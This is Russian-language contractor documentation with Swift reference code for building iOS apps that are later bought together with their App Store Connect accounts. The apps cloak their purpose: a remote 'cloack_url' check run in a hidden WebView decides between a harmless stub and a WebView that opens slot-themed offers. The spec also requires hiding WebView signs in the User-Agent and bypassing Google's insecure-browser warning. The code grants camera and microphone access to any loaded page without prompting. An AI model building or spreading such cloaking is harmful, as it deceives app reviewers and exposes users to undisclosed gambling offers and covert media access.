WWA · iOS Buyout Program

Разработка iOS-приложений под выкуп

Полная документация для подрядчиков — коммерческие условия, технические требования, флоу интеграции и референс-код.

1. Предмет и коммерческие условия

1.1 Что вы делаете

Разрабатываете iOS-приложение, которое:

  • реализует стартовый флоу с обращением к нашим сервисам (§4);
  • при выполнении условий сценария открывает WebView с оффером (§3.2);
  • в противном случае показывает белую часть (заглушку);
  • проходит все тесткейсы, соответствует WWA AppScore и требованиям к WebView;
  • опубликовано и живо в App Store.

1.2 Что выкупаем

Приложение вместе с аккаунтом App Store Connect и почтой, на которую этот аккаунт зарегистрирован. Передача аккаунта — обязательное условие выкупа.

1.3 Процесс от старта до оплаты

1.4 Расчёт суммы

Оплата динамическая:

Итоговый балл = Основные баллы + Баллы по тематике − Штрафные баллы
Сумма выкупа = Итоговый балл × Стоимость 1 балла по тематике

Пример. Приложение Chicken Road набрало 10 баллов, стоимость балла — $300 → выкуп $3 000.

3.3 Навигация и индикация

  • Кнопка «Назад» и свайп назад — навигация по истории WebView (allowsBackForwardNavigationGestures = true).
  • Спиннер или анимация загрузки во время загрузки страницы (didStartProvisionalNavigation → показать, didFinish → скрыть).

3.4 Порядок запросов и пуш-промт

Запросы к сервисам выполняются только после того, как пользователь принял или отклонил промт на пуш-уведомления.

Порядок при первом запуске: промт на пуши → запрос списка сервисов (шаг 1) → далее по флоу.

3.5 Кеширование

  • Сохранять final_url — конечный URL после цепочки редиректов (по событию didFinish; URL оффера вида offername.com/register).
  • При повторных запусках открывать сохранённый URL напрямую, без обращения к сервисам.
  • Если на первом запуске была показана заглушка — состояние сохраняется, и при повторных запусках открывается заглушка без обращения к сервисам.

5. Белая часть (заглушка)

  • Показывается при: 403 Invalid API Key, любой ошибке шага 1, statusCode ≠ 200 на проверке cloack_url, ошибке парсинга атрибуции.
  • При показе сохраняется флаг (show_stub) — при последующих запусках заглушка открывается сразу, без обращения к сервисам.
  • Адаптируется под Safe Area и все основные диагонали.
📋
Содержательные требования к белой части — что именно на ней размещается — выдаются менеджером до начала работы над UI.

6. Стор-ассеты и метаданные

Согласовываются с командой WWA до сабмита. Ошибки здесь дают больше всего штрафов (§2.4).

Иконка

  • Содержит элемент из тематики слота — иначе −0,5.
  • Единый стиль, персонаж и тема со скриншотами — расхождение даёт −1 CRITICAL.

Скриншоты

  • Главный персонаж / ключевой элемент присутствует — иначе −1 CRITICAL.
  • Никаких плейсхолдеров и незаконченных элементов — иначе −1 CRITICAL.
  • Второй скриншот не должен быть белым / нейтральным — иначе −0,5.
  • Демоигра или мокап присутствует хотя бы на части скринов — иначе −0,5.
  • Лого слота видно, не перекрыто и не заблюрено — иначе −0,5.
  • Иксы реалистичные: не x100, x1000 и выше — иначе −0,5.

Название и ключи

  • 1 слово — макс. балл; 2 слова — половина; 3 — 0; 4+ или нечитаемое — дополнительно −0,5.
  • Title содержит ключ по названию оригинального слота.
  • Слишком широкие / несвязанные ключи — −0,5.

7.1 Чек-лист самопроверки

Флоу

  • Первый запуск: промт на пуши показывается до любых сетевых запросов
  • Шаг 1 → шаг 2 → шаг 3 выполняются строго по порядку
  • 403 на шаге 1 → заглушка, флаг сохранён
  • cloack_url вернул ≠ 200 → заглушка, флаг сохранён
  • final_url сохранён после didFinish и это URL оффера, а не промежуточный редирект
  • Второй запуск: открывается кешированный URL, сетевые запросы не идут
  • Второй запуск после заглушки: открывается заглушка, запросов нет
  • OneSignal получил os_user_key и тег sub_app

WebView

  • User-Agent не содержит признаков WebView
  • Safe Area соблюдена в портрете и ландшафте, в т.ч. после блокировки/разблокировки экрана
  • Поворот экрана и адаптация загрузочных экранов работают
  • Кнопка «Назад» и свайп ведут по истории; с первой страницы WebView не закрывается
  • Цепочка редиректов без ошибок; ERR_TOO_MANY_REDIRECTS → загрузка последнего адреса
  • Cookie и сессия сохраняются после полного перезапуска приложения
  • Inline-видео автозапускается без фуллскрина и без ручного старта
  • Protected Media ID подтверждается без попапа
  • Загрузка файла на сайт без запроса доступа к файловой системе
  • Загрузка с камеры и из галереи проверена отдельно
  • Клавиатура не перекрывает активное поле ввода
  • Диплинки в другие приложения обрабатываются, возврат без ошибки
  • HTTP-ссылки без SSL открываются
  • Google-логин проходит без «This browser or app may not be secure»
  • target="_blank" открывается в том же WebView с возможностью возврата
  • Спиннер/анимация загрузки показывается и скрывается корректно

Сборка

  • Размер бандла ≤ 50 МБ (цель ≤ 10 МБ)
  • Deployment target iOS 14.0
  • Проверено на основных диагоналях, iOS 16+: нет обрезки, overflow и смещений
  • Info.plist содержит все ключи из §4.7
  • Иконка и скриншоты согласованы с WWA
  • Билд выдан QA WWA через TestFlight

8. Критерии приёмки (Definition of Done)

Приложение принимается к выкупу, если одновременно выполнено:

  1. Итоговый балл AppScore ≥ 8.
  2. Штрафных баллов менее 2 и ни одного нарушения типа CRITICAL.
  3. Пройдены все тесткейсы, чек-лист §7.1 закрыт полностью.
  4. Иконка и скриншоты согласованы с командой WWA до сабмита.
  5. Приложение опубликовано в App Store и живо.
  6. Готовы к передаче аккаунт App Store Connect и почта регистрации.
⏱

// MARK: - AppLaunch Flow (вызвать из viewDidLoad)

func startApp() {
    let defaults = UserDefaults.standard

    // Повторный запуск: уже был на оффере
    if let cached = defaults.string(forKey: Cache.finalURL),
       let url = URL(string: cached) {
        loadWebView(url: url)
        return
    }

    // Повторный запуск: уже был на заглушке
    if defaults.bool(forKey: Cache.showStub) {
        showStubScreen()
        return
    }

    // Первый запуск — запросить разрешение на пуши, затем стартовать флоу
    requestPushPermission {
        self.fetchLinks()
    }
}

func requestPushPermission(completion: @escaping () -> Void) {
    UNUserNotificationCenter.current()
        .requestAuthorization(options: [.alert, .badge, .sound]) { _, _ in
            DispatchQueue.main.async { completion() }
        }
}

// MARK: - Step 1: Fetch Service Links

func fetchLinks() {
    guard let url = URL(string: API.getLinksURL) else { return }

    var request = URLRequest(url: url)
    request.httpMethod = "GET"
    request.setValue(API.apiKey, forHTTPHeaderField: "apikey")
    request.setValue(API.bundle, forHTTPHeaderField: "bundle")

    URLSession.shared.dataTask(with: request) { data, response, error in

        guard let http = response as? HTTPURLResponse else {
            DispatchQueue.main.async { self.showStubScreen() }
            return
        }

        if http.statusCode == 403 {
            DispatchQueue.main.async { self.showStubScreen() }
            return
        }

        guard let data = data,
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: String],
              let cloakURL   = json["cloack_url"],
              let atrService = json["atr_service"]
        else {
            DispatchQueue.main.async { self.showStubScreen() }
            return
        }

        DispatchQueue.main.async {
            self.checkCloaker(cloakURL: cloakURL, atrService: atrService)
        }

    }.resume()
}

A.3 Шаг 2 — Проверка в скрытом WebView

// MARK: - Step 2: Hidden WKWebView check

class CloakerChecker: NSObject, WKNavigationDelegate {

    private var webView: WKWebView?
    private var onResult: ((Bool) -> Void)?

    func check(urlString: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: urlString) else {
            completion(false); return
        }
        onResult = completion

        let config = WKWebViewConfiguration()
        webView = WKWebView(frame: .zero, configuration: config)
        webView?.navigationDelegate = self

        UIApplication.shared.keyWindow?.addSubview(webView!)
        webView?.load(URLRequest(url: url))
    }

    func webView(_ webView: WKWebView,
                 decidePolicyFor response: WKNavigationResponse,
                 decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {

        if let http = response.response as? HTTPURLResponse {
            let passed = (http.statusCode == 200)
            onResult?(passed)
            onResult = nil
            webView.removeFromSuperview()
        }
        decisionHandler(.allow)
    }
}

// MARK: - Step 3: Fetch Attribution

func fetchAttribution(atrService: String) {
    guard let url = URL(string: atrService) else { return }

    var request = URLRequest(url: url)
    request.httpMethod = "GET"
    request.setValue(API.apiKeyApp,  forHTTPHeaderField: "apikeyapp")
    request.setValue(getDeviceIP(),  forHTTPHeaderField: "ip")
    request.setValue(getUserAgent(), forHTTPHeaderField: "useragent")
    request.setValue(Locale.current.languageCode ?? "en",
                                     forHTTPHeaderField: "langcode")

    URLSession.shared.dataTask(with: request) { data, response, error in

        guard let data = data,
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: String],
              let finalURLStr = json["final_url"],
              let pushSub     = json["push_sub"],
              let osUserKey   = json["os_user_key"],
              let finalURL    = URL(string: finalURLStr)
        else {
            DispatchQueue.main.async { self.showStubScreen() }
            return
        }

        UserDefaults.standard.set(finalURLStr, forKey: Cache.finalURL)

        DispatchQueue.main.async {
            self.loadWebView(url: finalURL)
            self.setupOneSignal(osUserKey: osUserKey, pushSub: pushSub)
        }

    }.resume()
}

func getUserAgent() -> String {
    return WKWebView().value(forKey: "userAgent") as? String
        ?? "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)"
}

// MARK: - WebView Setup & Navigation

class OfferViewController: UIViewController, WKNavigationDelegate {

    var webView: WKWebView!

    override func viewDidLoad() {
        super.viewDidLoad()

        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true   // видео внутри страницы

        webView = WKWebView(frame: view.bounds, configuration: config)
        webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        webView.navigationDelegate = self
        webView.uiDelegate = self                  // для target="_blank"
        webView.allowsBackForwardNavigationGestures = true
        view.addSubview(webView)

        navigationItem.leftBarButtonItem = UIBarButtonItem(
            title: "‹ Назад",
            style: .plain,
            target: self,
            action: #selector(goBack)
        )
    }

    @objc func goBack() {
        if webView.canGoBack { webView.goBack() }
    }

    // Индикатор загрузки
    func webView(_ webView: WKWebView, didStartProvisionalNavigation _: WKNavigation!) {
        showLoadingIndicator()
    }

    func webView(_ webView: WKWebView, didFinish _: WKNavigation!) {
        hideLoadingIndicator()
    }

    // target="_blank" — открывать в том же WebView
    func webView(_ webView: WKWebView,
                 createWebViewWith configuration: WKWebViewConfiguration,
                 for navigationAction: WKNavigationAction,
                 windowFeatures: WKWindowFeatures) -> WKWebView? {
        if navigationAction.targetFrame == nil {
            webView.load(navigationAction.request)
        }
        return nil
    }

    // Камера / галерея — разрешить в WebView
    func webView(_ webView: WKWebView,
                 requestMediaCapturePermissionFor origin: WKSecurityOrigin,
                 initiatedByFrame frame: WKFrameInfo,
                 type: WKMediaCaptureType,
                 decisionHandler: @escaping (WKPermissionDecision) -> Void) {
        decisionHandler(.grant)
    }
}
